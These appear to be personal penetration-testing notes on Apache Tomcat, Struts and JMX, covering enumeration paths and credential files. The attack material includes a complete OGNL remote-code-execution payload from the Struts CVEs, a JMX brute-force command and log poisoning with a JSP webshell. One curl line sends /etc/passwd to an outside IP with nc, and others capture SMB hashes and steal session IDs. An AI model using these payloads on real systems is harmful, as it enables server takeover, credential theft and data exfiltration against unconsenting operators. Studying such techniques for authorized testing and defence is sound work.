Tomcat
	
	
	--server infrastructure for Java Servlets, e.g. Struts apps

Structure
	Apache Coyote
		-Connector that supports the HTTP/1.1 protocol
			--allows communication with the servlet container component, e.g. Apache Catalina
	Apache Catalina
		-container determining which servlets need to be called when Tomcat receives HTTP requests
			--converts the HTTP requests and responses from text to Java objects which are used by the servlets
							Catalina
							-----------
			Coyote			|webapp	  |--context
	-------->HTTP---------->| -servlet|   .war file
			Connector		| -servlet| (seperate loader
							|		  |  class)
	---->Apache->Coyote---->|webapp	  |
		 HTTPD	  AJP		| -servlet|
				 Connector	| -servlet|
							-----------
			--Java Servlet Specification:
				https://jcp.org/aboutJava/communityprocess/final/jsr369/index.html
	
Enumeration:
/admin/j_security_check
	--path of the Apache Tomcat Administration page
/docs/
/examples/
/host-manager
/host-manager/
/host-manager/html
/manager
	-By default the Manager is only accessible from a browser running on the same machine as Tomcat.
		--configure host-based access controls $CATALINA_HOME/conf/context.xml
	--401 response for authentication-based access; 403 response for host-based access
/manager/
/manager/html
/manager/status
/META-INF/context.xml
/WEB-INF/
/WEB-INF/web.xml

404 "- Not Found" pages should return with Tomcat version information
	--compare against https://wiki.apache.org/tomcat/TomcatVersions

8080 - default Tomcat Manager Port

Target files:
?? $CATALINA_HOME == usr/local/tomcat
$CATALINA_HOME/conf/tomcat-users.xml
$CATALINA_HOME/conf/web.xml
$CATALINA_HOME/conf/server.xml
$CATALINA_HOME/conf/user-conf.xml
	--password storage, default storage type is plaintext




Apache Struts Framework
	--MVC architecture
		Model - Represents the application data
			--e.g. class handling data
			--Data Model, Business Logic
		View - Output of the application
			--JSP pages or other presentation-layer technologies
		Controller - Accepts user input
			-FilterDispatcher - responsible with invoking the right (Model) action based on the request
			--controller uses Model to generate View
			--maps requests to actions
			--handles http requests
		Actions - Apache Struts Model
		Interceptors - hooks that can be called before or after processing a request
			--part of the controller
		OGNL (value stack) - stack of objects
			--e.g. Model or Action objects
		Restults/Result Type - Information used to determine view for use after business logic
		View Technologies - Handle how data is displayed
SSTI
	--JSP enables the generation of dynamic HTML code by mixing static HTML with the dynamic code that is executed on the server
		--e.g.  <li><p><b>First Name:</b>  <%= request.getParameter("first_name")%>
		--may accept user input
	--possible to use Expression Language in JSP files
		--e.g. <jsp:text> box perimeter is: ${2*box.width + 2*box.height} </jsp:text>
	--multiple server-side template engines available
		-e.g.  FreeMarker, Velocity, Thymeleaf
Expression Language Injection
	


OGNL Injection
	--Object-Graph Navigation Language injection
		https://commons.apache.org/proper/commons-ognl/language-guide.html
	--open source Expression Language for Java
	--primary function to get and set object properties
	--cause of various major Struts vulnerabilties
	--most functionality in Java possible with OGNL
	--OGNL expressions evaluated using %{code} or ${code}
	OGNL allows:
		Acessing properties
		Call methods
		Access elements from arrays, or combine them
		Use variables
		Create arrays or maps
		Access static fields
		Access static methods
	Testing Inputs:
		test%{9+1}
		
	Exploitation:
		(#context['xwork.MethodAccessor.denyMethodExecution']=false)
			--enable method execution directly from the payload before any method call
	
	Protections:
		SecurityMemberAccess class, available during payload execution as _memberAccess, determines OGNL capabilities
			--option to use the more permissive DefaultMemberAccess class
		Blacklisting of classes and package names
		Restriction to call static methods
			-- allowStaticMethodAccess field of _memberAccess class
	
	Payload Example (taken from CVE-2017-5638 and CVE-2018-11776):
		(#_='multipart/form-data').
		(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
		(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
		(#context['xwork.MethodAccessor.denyMethodExecution']=false).
		(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
		(#ognlUtil.getExcludedPackageNames().clear()).
		(#ognlUtil.getExcludedClasses().clear()).
		(#context.setMemberAccess(#dm)))).
		(#cmd='/usr/bin/touch /tmp/pwned').(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
		(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
		(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).
		(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
		(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())


Debugging (IntelliJ Idea)
Java Debugging (Intellij Idea)
Run>Debug>Edig Configuration
>+>Maven
jetty:run -f pom.xml
set breakpoint on method execution
navigate in browser to expected method invocation request
	-IntelliJ Debugger frame should be populated with stack trace


JMX
	9999, 1099, 2001, 8009 - most common default ports for network-exposed JMX interface running on Tomcat Servers
		--not enabled by default
		--random high portno often also set
	--used to monitor and manage Tomcat installations
	jConsole (default JDK interface tool)
	jconsole
		--command to open jConsole interface on *nix or Win
	JMX service configured to support auth by default
		--when authentication is enabled auth model allows access to two different users belonging to readonly or readwrite role
	--access is equivalent to admin/root access
	--sensitive information, e.g. session IDs, available via JMX
	--interacts with the server (runtime environment) via Java Remote Method Invocation (RMI) calls
	Enumeration:
		nmap using -sV or -A with --version-all and '--script version' flags set
			e.g. nmap -A -sV -p 1099,8009 --script version --version-all target.dom
		-if jconsole connection to target server fails capture packets for connection and check for an "Authentication failed! Credentials required" error message"
			--may be followed by a partial (JRE) stack trace debugging/verbose error message in response
			--"Invalid username or password" likely included in error message encapsulated in a following packet
	Exploitation:
		Brute Force
			jmxbf
				https://github.com/nccgroup/jmxbf
			java -jar jmxbf.jar
			java –jar jmxbf.jar –h 111.11.1.11 –p 1099 –uf usernames.txt –pf passwords.txt
		(From jConsole)
			(Read Access)
		Users->User->”manager”->UserDatabase->Attributes
			--read tomcat manager password
			-from Tomcat Manager execute web application archive (.war) format shell to execute code on system
				--on Windows this will usually run as SYSTEM or administrator
			(Write Access, no Tomcat Manager Interface)
		Catalina->Valve->localhost->AccessLogValve->Operations
			--rotate function used to save Tomcat access logs to file on server
			boolean rotate(string newFileName)
				--possible path traversal, arbitrary file write capabilities
			Catalina->VMSummary
				-catalina.base property exposed
				--returns a webapps folder which includes the various web applications served by Tomcat
			curl 'http://target.dom/attack?<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
				--poison Tomcat access logs with request that includes valid JSP code in the URL
				--create a Java Servlet Page (JSP) file under a directory used by Tomcat to serve a web application
			File can be written within catalina.base (tomcat root directory) to publicly accessible directory, e.g. as /webapps/docs/cmd.jsp
				--target written file with rotate function
			curl http://target.dom/docs/test.jsp?cmd=sh%20-c%20$@|sh%20.%20echo%20/bin/cat%20/etc/passwd%20|%20nc%20111.11.1.11%208080
				--may be possible to execute wget to download, then exec more versitile JSP shell
		SMB challenge-responses hashes
			\\111.11.1.11\share
				--execute as rotate function in jConsole
			-use Metasploit SMB capture auxiliary module or Impacket equivelant to capture NTLM hash
		Return Web Application Users' session IDs
			Catalina->Manager->[ApplicationName]->Operations->listSessionIds()
				--only available with write permissions
	